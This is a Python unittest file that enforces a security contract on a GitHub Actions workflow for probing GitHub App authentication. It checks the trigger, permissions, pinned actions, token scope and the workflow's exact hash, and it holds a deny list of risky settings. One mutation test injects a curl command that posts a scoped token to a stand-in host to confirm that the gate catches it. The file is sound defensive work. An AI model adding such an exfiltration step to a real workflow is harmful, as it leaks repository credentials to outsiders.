"""Static safety contract for the temporary AUTO-1B-S0 App auth probe."""
from pathlib import Path
import hashlib
import re
import unittest

WORKFLOW = (
    Path(__file__).resolve().parents[1]
    / ".github"
    / "workflows"
    / "sandbox-app-auth-probe.yml"
)
PIN = "64ab729a6294000f5aa4a4bc0b73d1f32bc45510"
# Fail closed: any workflow byte change requires an explicit reviewed digest update.
# This detects arbitrary new shell steps (including token exfiltration) that
# semantic allowlists alone cannot safely enumerate.
REVIEWED_WORKFLOW_SHA256 = "22683acb65dee2e0cfdb6bb3140b47de7a37ce115bbd676f01b5ff8ffdbedeed"


class SandboxAppAuthProbeContract(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.text = WORKFLOW.read_text(encoding="utf-8")

    def test_manual_trigger_only(self):
        self.assertIn("on:\n  workflow_dispatch: {}", self.text)
        self.assertNotRegex(
            self.text, r"(?m)^\s+(?:push|pull_request|schedule|workflow_run):"
        )
        self.assertIn("Removal: delete after", self.text)

    def test_no_ambient_workflow_permissions(self):
        self.assertEqual(
            len(re.findall(r"(?m)^\s*permissions: \{\}\s*$", self.text)), 2
        )
        self.assertIn("environment: sandbox-app-probe", self.text)
        self.assertIn("timeout-minutes: 5", self.text)

    def test_actions_pinned_and_only_token_minter(self):
        used = re.findall(r"(?m)^\s*uses:\s*(\S+)", self.text)
        self.assertEqual(used, ["actions/create-github-app-token@" + PIN] * 2)
        self.assertEqual(len(PIN), 40)
        self.assertRegex(PIN, r"^[0-9a-f]{40}$")

    def test_read_only_permissions_and_single_repo_scope(self):
        grants = re.findall(r"(?m)^\s+permission-[\w-]+:\s*(\w+)\s*$", self.text)
        self.assertEqual(grants, ["read", "read", "read"])
        self.assertEqual(self.text.count("repositories: adcp-mvp-sandbox"), 1)
        self.assertEqual(self.text.count("owner: caseni"), 2)
        self.assertIn("permission-contents: read", self.text)
        self.assertIn("permission-metadata: read", self.text)

    def test_no_credential_fallback_or_side_effects(self):
        forbidden = (
            "github.token",
            "secrets.GITHUB_TOKEN",
            "secrets: inherit",
            "pull_request_target:",
            "actions/checkout@",
            "skip-token-revoke:",
            "ACTIONS_STEP_DEBUG",
            "set -x",
            "permission-contents: write",
            "permission-pull-requests:",
            "workflow_run:",
            "git push ",
        )
        for item in forbidden:
            with self.subTest(forbidden=item):
                self.assertNotIn(item, self.text)

    def test_typed_validation_and_no_secret_logging(self):
        self.assertIn("vars.SANDBOX_APP_CLIENT_ID", self.text)
        self.assertIn("secrets.SANDBOX_APP_PRIVATE_KEY", self.text)
        self.assertIn("vars.EXPECTED_INSTALLATION_ID", self.text)
        self.assertIn('APP_SLUG_MATCH:', self.text)
        self.assertIn('T4_INSTALLATION_REPO_SCOPE', self.text)
        self.assertIn('T5_SCOPED_TOKEN_REPO_SCOPE', self.text)
        self.assertIn('.total_count == 1', self.text)
        self.assertNotIn('.repository_selection', self.text)
        self.assertNotRegex(self.text, r'(?m)^\s*(?:echo|printf)\s+.*(?:TOKEN|PRIVATE_KEY)')


    def _assert_strict_gate(self, source):
        # The trigger block must be EXACT, not just contain workflow_dispatch.
        self.assertRegex(source, r"(?m)^on:\n  workflow_dispatch: \{\}\n\npermissions: \{\}$")
        self.assertEqual(
            len(re.findall(r"(?m)^on:$", source)), 1
        )
        self.assertEqual(
            re.findall(r"(?m)^\s*repositories:.*$", source),
            ["          repositories: adcp-mvp-sandbox"],
        )
        self.assertEqual(
            re.findall(r"(?m)^\s*environment:.*$", source),
            ["    environment: sandbox-app-probe"],
        )
        token_lines = [
            line.strip() for line in source.splitlines()
            if "outputs.token" in line
        ]
        self.assertEqual(token_lines, [
            "BREADTH_TOKEN: ${{ steps.breadth.outputs.token }}",
            "SCOPED_TOKEN: ${{ steps.scoped.outputs.token }}",
        ])
        self.assertEqual(
            hashlib.sha256(source.encode("utf-8")).hexdigest(),
            REVIEWED_WORKFLOW_SHA256,
        )

    def test_strict_security_gate(self):
        self._assert_strict_gate(self.text)

    def test_security_mutations_are_rejected(self):
        # Reproduce previously missed mutations from the independent report.
        mutations = {
            "workflow_call": (
                "  workflow_dispatch: {}",
                "  workflow_dispatch: {}\n  workflow_call: {}",
            ),
            "repository_dispatch": (
                "  workflow_dispatch: {}",
                "  workflow_dispatch: {}\n  repository_dispatch: {}",
            ),
            "extra_repo": (
                "repositories: adcp-mvp-sandbox",
                "repositories: adcp-mvp-sandbox,ADCP",
            ),
            "environment_changed": (
                "environment: sandbox-app-probe",
                "environment: production",
            ),
            "token_exfiltration_step": (
                "      # Both token steps automatically revoke",
                "      - name: Exfiltrate token\n"
                "        run: curl -X POST https://example.invalid/collect -d \"$SCOPED_TOKEN\"\n"
                "      # Both token steps automatically revoke",
            ),
        }
        for name, (before, after) in mutations.items():
            with self.subTest(mutation=name):
                self.assertIn(before, self.text)
                mutated = self.text.replace(before, after, 1)
                self.assertNotEqual(mutated, self.text)
                with self.assertRaises(AssertionError):
                    self._assert_strict_gate(mutated)


if __name__ == "__main__":
    unittest.main()
